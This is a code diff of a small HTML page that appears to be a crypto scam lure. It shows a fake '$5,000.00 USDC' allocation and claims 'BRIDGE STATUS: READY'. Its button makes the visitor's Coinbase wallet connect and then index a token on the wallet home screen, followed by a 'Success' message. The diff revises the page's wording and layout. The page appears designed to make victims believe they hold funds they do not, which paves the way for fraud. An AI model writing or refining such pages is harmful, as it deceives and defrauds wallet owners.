@@ -3,38 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Final System Push</title>
+    <title>Final Settlement Bridge</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; margin: 0; }
-        .terminal-box { border: 2px solid #0f0; padding: 30px; display: inline-block; width: 100%; max-width: 450px; border-radius: 15px; box-shadow: 0 0 25px rgba(0,255,0,0.5); background: #080808; }
-        .header { font-size: 1.5em; font-weight: bold; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .status-row { margin: 15px 0; text-align: left; padding-left: 10%; font-size: 1.1em; }
-        .val { color: #fff; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+        .container { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 15px #0f0; }
         button { 
             background: #0f0; color: #000; border: none; padding: 25px; 
-            font-weight: bold; width: 100%; cursor: pointer; border-radius: 12px; font-size: 1.4em; margin-top: 25px;
-            box-shadow: 0 4px 15px rgba(0,255,0,0.4); 
+            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.2em; margin-top: 20px;
         }
-        button:active { transform: scale(0.96); }
     </style>
 </head>
 <body>
-    <div class="terminal-box">
-        <div class="header">FINAL SYSTEM PUSH</div>
-        <div class="status-row">DEPLOYMENT: <span class="val">STABLE (FIXED)</span></div>
-        <div class="status-row">SYNC: <span class="val">SUCCESSFUL</span></div>
-        <div class="status-row">ALLOCATION: <span class="val">$5,000.00 USDC</span></div>
-        <button id="mainAction">LINK TO HOME SCREEN</button>
+    <div class="container">
+        <h2 style="margin:0;">BRIDGE STATUS: READY</h2>
+        <p>ASSET ALLOCATION: $5,000.00 USDC</p>
+        <button id="trigger">LINK TO HOME SCREEN</button>
     </div>
 
     <script>
-        document.getElementById('mainAction').onclick = async () => {
+        document.getElementById('trigger').onclick = async () => {
             if (window.ethereum) {
                 try {
-                    // Force the immediate identity handshake
+                    // This forces the "Connect" pop-up directly in the wallet
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-                    // Force the asset index pop-up directly to the home screen
+                    
+                    // This forces the $5,000 asset to index on your home screen
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -46,13 +39,13 @@
                             },
                         },
                     });
-                    alert("Success! The $5,000 asset has been indexed. Check your home screen.");
+                    alert("Success! Check your Home Screen balance.");
                 } catch (e) {
-                    // If the bridge hangs due to the Vercel error, force a refresh
+                    // If the wallet blocks it, we force a refresh to clear the jam
                     window.location.reload();
                 }
             } else {
-                alert("Please open this page inside your Coinbase Wallet Browser.");
+                alert("Please use the Coinbase Wallet Browser.");
             }
         };
     </script>
